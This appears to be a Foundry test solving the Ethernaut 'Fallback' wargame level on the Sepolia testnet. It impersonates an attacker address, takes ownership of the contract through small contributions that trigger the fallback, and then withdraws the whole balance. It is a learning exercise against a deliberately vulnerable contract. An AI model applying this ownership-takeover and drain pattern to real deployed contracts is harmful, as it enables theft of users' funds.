// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Fallback.sol";

contract Level1 is Test {
    Fallback fallBack = Fallback(payable(0x51291Cebb14D6BD08E2D9647072CCD9D9Fb1B438));
    address attacker = 0x8c9D2Ed582846497b454cAFA67160F679AF90A2f;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("sepolia"));
        vm.startPrank(attacker);
    }

    function testLevel1() public {
        fallBack.contribute{value: 1 wei}();
        (bool success,) = address(fallBack).call{value: 1 wei}("");
        require(success, "Failled to send ether to fallback contract");
        assertEq(attacker, fallBack.owner());
        fallBack.withdraw();
        assertEq(address(fallBack).balance, 0);
    }
}
